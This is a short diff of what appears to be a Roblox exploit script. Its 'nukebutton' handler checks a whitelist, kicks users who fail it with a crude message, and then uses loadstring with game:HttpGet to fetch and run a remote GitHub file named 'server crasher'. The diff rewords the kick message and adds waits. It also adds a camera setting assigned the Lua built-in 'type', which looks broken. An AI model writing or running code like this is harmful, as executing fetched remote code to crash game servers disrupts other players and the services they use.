@@ -1131,8 +1131,12 @@ nukebutton.MouseButton1Down:connect(function()
 end
 
 if not authenticated() then
-    return game.Players.LocalPlayer:Kick("There ain't no way you usin this shit mate.")
+    return game.Players.LocalPlayer:Kick("There ain't no way you usin this shit mate. At least not until you have been whitelisted a second time 🤔")
 end
 
+game:GetService("Players").LocalPlayer.DevCameraOcclusionMode = type
+wait()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ImNotYukiiSoDontAsk/YH6/main/server%20crasher", true))()
+wait()
 end)
